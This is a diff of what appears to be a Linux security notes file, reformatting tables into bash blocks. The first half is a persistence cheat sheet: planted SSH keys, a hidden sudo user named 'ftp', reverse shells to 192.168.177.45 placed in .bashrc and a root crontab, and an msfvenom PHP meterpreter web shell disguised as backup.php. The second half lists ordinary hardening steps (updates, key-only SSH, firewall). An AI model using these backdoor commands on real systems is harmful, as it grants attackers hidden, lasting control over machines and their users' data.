@@ -95,47 +95,63 @@ $ tail -f /var/log/ufw.log
 <tr>
 <th>maintain access</th>
 <td>generate ssh key & maintain backdoor <br /></td>
-<td>$ ssh-keygen -t rsa <br />
-> /root/.ssh/godseye (name it godseye and put it in root) <br />
-§ ls <br />
-$ cat godseye <br />
-$ cat godseye.pub <br />
-$ ssh-copy-id -i godseye.pub user@ip <br />
-$ ssh -i godseye user@ip <br />
-$ sudo su <br />
-$ cd .ssh/ <br />
-$ ls <br />
-$ cat authorized_keys <br /></td>
+<td>
+
+```bash
+$ ssh-keygen -t rsa 
+> /root/.ssh/godseye # (name it godseye and put it in root) 
+§ ls 
+$ cat godseye 
+$ cat godseye.pub 
+$ ssh-copy-id -i godseye.pub user@ip 
+$ ssh -i godseye user@ip 
+$ sudo su 
+$ cd .ssh/ 
+$ ls 
+$ cat authorized_keys 
+```
 </tr>
 
 
 <tr>
 <th>ssh configuration</th>
 <td>modify ssh configuration<br /></td>
-<td>$ nano /etc/ssh/sshd_config (RSAAuthentication should be yes to login without password)<br /></td>
+<td>
+
+```bash
+$ nano /etc/ssh/sshd_config # (RSAAuthentication should be yes to login without password)
+```
 </tr>
 
 <tr>
 <th>adding a sneaky user</th>
 <td>Adding a sneaky user in remote<br /></td>
 
-<td>$ sudo su<br />
-$ cd .. (go to home folder)<br />
-$ ls<br />
-$ useradd -m -s /bin/bash ftp<br />
-$ usermod -aG sudo ftp<br />
-$ passwd ftp<br />
-$ ssh ftp@ip<br /></td>
+<td>
+
+```bash
+$ sudo su
+$ cd .. # (go to home folder)
+$ ls
+$ useradd -m -s /bin/bash ftp
+$ usermod -aG sudo ftp
+$ passwd ftp
+$ ssh ftp@ip
+```
+</td>
 </tr>
 
 <tr>
 <th>bashrc profile</th>
 <td>modify ssh configuration<br /></td>
 <td>$ ssh ftp@ip<br />
-$ cd .. (go to home folder)<br />
-$ nano user/.bashrc<br />
-$ sh -i >& /dev/tcp/192.168.177.45/9000 0>&1 (put in a sneaky command)<br />
-$ nc -lvp 9000 (from local system and anytime a user logs into remote we get an ip)<br />
+
+```bash
+$ cd .. # (go to home folder)
+$ nano user/.bashrc
+$ sh -i >& /dev/tcp/192.168.177.45/9000 0>&1 # (put in a sneaky command)
+$ nc -lvp 9000 # (from local system and anytime a user logs into remote we get an ip)
+```
 </td>
 </tr>
 
@@ -143,35 +159,44 @@ $ nc -lvp 9000 (from local system and anytime a user logs into remote we get an 
 <th>cron tab in remote machine</th>
 <td>getting a cron tab in remote machine to get a backdoor<br /></td>
 <td>
-$ sudo su (in remote)<br />
-$ crontab -e (type '2' for nano)<br />
-$ ***** /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.177.45/9000 0>&1 (add this cronjob)<br />
-$ nc -nlvp 9000 (in local use netcat and we get a connection as root #)<br />
+
+```bash
+$ sudo su # (in remote)
+$ crontab -e # (type '2' for nano)
+$ ***** /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.177.45/9000 0>&1 # (add this cronjob)
+$ nc -nlvp 9000 # (in local use netcat and we get a connection as root #)
+```
+
 </td>
 </tr>
 
 <tr>
 <th>use metasploit to get persistence in a system</th>
 <td>webshell using msfvenom<br /></td>
-<td>$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.177.45 LPORT=9001 -e php/base64 -f raw shell.php (create a web shell)<br />
-$ ls <br />
-$ nano shell.php <br />
-$ create php code and $ cat shell.php (copy the code)<br />
-$ sudo su (in remote) <br />
-$ cd /var/www/html/ <br />
-$ ls <br />
-$ nano backup.php (paste the code)<br />
-$ nano /etc/sudoers (in USER PRIVILEDGES add 'www-data ALL=(ALL:ALL) ALL for web server) <br />
-$ passwd www-data (www-data user got access)<br />
-$ msfconsole (in local) <br />
+<td>
+
+```bash
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.177.45 LPORT=9001 -e php/base64 -f raw shell.php # (create a web shell)
+$ ls 
+$ nano shell.php 
+$ create php code and $ cat shell.php # (copy the code)
+$ sudo su # (in remote) 
+$ cd /var/www/html/ 
+$ ls
+$ nano backup.php # (paste the code)
+$ nano /etc/sudoers # (in USER PRIVILEDGES add 'www-data ALL=(ALL:ALL) ALL for web server) 
+$ passwd www-data # (www-data user got access)
+$ msfconsole # (in local) 
 > use  multi/handler <br />
 > set payload php/meterpreter/reverse_tcp <br />
 > set lhost 192.168.177.45 <br />
 > set lport 9001 <br />
 > run <br />
-$ curl 192.168.177.48/backup.php (from local shell)<br />
-We get a meterpreter shell to remote host:<br />
-> whoami <br />
+$ curl 192.168.177.48/backup.php # (from local shell)
+
+We get a meterpreter shell to remote host:<
+> whoami 
+```
 </td>
 </tr>
 
@@ -191,66 +216,90 @@ We get a meterpreter shell to remote host:<br />
 <tr>
 <th>Enable Automatic Updates</th>
 <td>Automatic updates and security patches of applications<br /></td>
-<td>$ apt update<br />
-$ apt dist-upgrade<br />
-$ apt install unattended-upgrades<br />
-$ dpkg-reconfigure --priority=low unattended-upgrades ( hit YES) <br />
+<td>
+
+```bash
+$ apt update
+$ apt dist-upgrade
+$ apt install unattended-upgrades
+$ dpkg-reconfigure --priority=low unattended-upgrades # ( hit YES) 
+```
 </td>
 </tr>
 
 <tr>
 <th>Limiting User Account</th>
 <td>Avoid logging in as root<br /></td>
-<td>$ adduser skk<br />
-$ usermod -aG sudo skk (add skk to sudo group)<br />
-$ logout <br />
-$ ssh skk@ip <br />
-skk$ sudo adduser saikia (we just got sudo power via skk) <br />
+<td>
+
+```bash
+$ adduser skk
+$ usermod -aG sudo skk # (add skk to sudo group)
+$ logout
+$ ssh skk@ip 
+skk$ sudo adduser saikia # (we just got sudo power via skk) 
+```
 </td>
 </tr>
 
 <tr>
 <th>Authentication Key Pair over Passwords</th>
 <td>Public Key and Private Key<br /></td>
-<td>$ mkdir ~/.ssh && chmod 700 ~/.ssh<br />
-$ ssh-keygen -b 4096 (generating the public private key pair in localhost)<br />
-$ cd .ssh<br />
-$ ls <br />
-$ scp $env:USERPROFILE/.ssh/id_rsa.pub user@ip:~/.ssh/authorized_keys (Windows only) <br />
-$ ssh-copy-id user@ip <br />
-$  scp ~/.ssh/id_rsa.pub user@ip:~/.ssh/authorized_keys (linux only) <br />
+<td>
+
+```bash
+$ mkdir ~/.ssh && chmod 700 ~/.ssh
+$ ssh-keygen -b 4096 # (generating the public private key pair in localhost)
+$ cd .ssh
+$ ls 
+$ scp $env:USERPROFILE/.ssh/id_rsa.pub user@ip:~/.ssh/authorized_keys # (Windows only) 
+$ ssh-copy-id user@ip
+$  scp ~/.ssh/id_rsa.pub user@ip:~/.ssh/authorized_keys # (linux only) 
+```
 </td>
 </tr>
 
 <tr>
 <th>Lockdown Logins</th>
 <td>no passwords across the board<br /></td>
-<td>$ sudo nano /etc/ssh/sshd_config <br />
-$ (change port no in the ssh config file. port 22 is used by ssh by default and we can change that by configuring the config file : remove '#'(uncomment) and in config file: <br />Port 717<br />AddressFamily inet<br />PermitRootLogin no<br />PasswordAuthentication no ) <br />
-$ sudo systemctl restart sshd <br />
-$ ssh user@ip -p 717 (I can login via the new port)<br />
+<td>
+
+```bash
+$ sudo nano /etc/ssh/sshd_config 
+$ # change port no in the ssh config file. port 22 is used by ssh by default and we can change that by configuring the config file : remove '#'(uncomment) and in config file: 
+Port 717
+AddressFamily inet
+PermitRootLogin no 
+PasswordAuthentication no ) 
+$ sudo systemctl restart sshd 
+$ ssh user@ip -p 717 # (I can login via the new port)
+```
 </td>
 </tr>
 
 <tr>
 <th>Firewall it up!</th>
 <td>Check ports and configure firewall<br /></td>
-<td>$ sudo ss -tupln<br />
-$ ufw (uncomplicated firewall)<br />
-$ sudo apt install ufw <br />
-$ sudo ufw status <br />
-$ sudo ufw allow 717 (update firewall for custom port) <br />
-$ sudo ufw enable <br />
-$ sudo apt install apache2 <br />
-$ sudo systemctl start apache2 <br />
-$ sudo ss -tupln <br />
-$ ping ip -t (to check if server is up) <br />
-$ sudo nano /etc/ufw/before.rules (block ping to protect servers) <br />
-> edit & add in: <br />
-> #ok icmp codes for INPUT <br />
-> A ufw-before-input -p icmp --icmp-type echo-request -j DROP<br />
-$ sudo ufw reload<br />
-$ sudo reboot (server is invisible to pings now)<br />
+<td>
+
+```bash
+$ sudo ss -tupln
+$ ufw # (uncomplicated firewall)
+$ sudo apt install ufw 
+$ sudo ufw status 
+$ sudo ufw allow 717 # (update firewall for custom port) 
+$ sudo ufw enable 
+$ sudo apt install apache2 
+$ sudo systemctl start apache2 
+$ sudo ss -tupln
+$ ping ip -t # (to check if server is up) 
+$ sudo nano /etc/ufw/before.rules # (block ping to protect servers) 
+> edit & add in: 
+> #ok icmp codes for INPUT 
+> A ufw-before-input -p icmp --icmp-type echo-request -j DROP
+$ sudo ufw reload
+$ sudo reboot # (server is invisible to pings now)
+```
 </td>
 </tr>
 </table>
